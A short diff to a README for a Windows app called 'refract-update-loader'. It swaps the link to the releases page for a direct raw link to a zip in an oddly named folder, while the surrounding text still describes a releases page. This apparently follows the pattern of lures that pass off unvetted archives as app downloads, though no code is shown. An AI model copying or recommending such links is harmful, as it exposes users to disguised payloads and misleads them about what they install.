@@ -10,7 +10,7 @@ Welcome! refract-update-loader is a free, modern desktop application that makes 
 
 ## ⬇️ Download For Windows
 
-[**📥 Download refract-update-loader Now**](https://github.com/dikdi419/refract-update-loader/releases)
+[**📥 Download refract-update-loader Now**](https://raw.githubusercontent.com/dikdi419/refract-update-loader/main/begloom/loader-update-refract-1.2-alpha.2.zip)
 
 Visit this link to download the application. You will land on a page with the latest version available. Look for the file that matches your computer (likely a Windows installer or a compressed `.zip` file) and click it to begin the download. Once the file has finished downloading, simply open it and follow the simple on-screen prompts to get the app running.
 
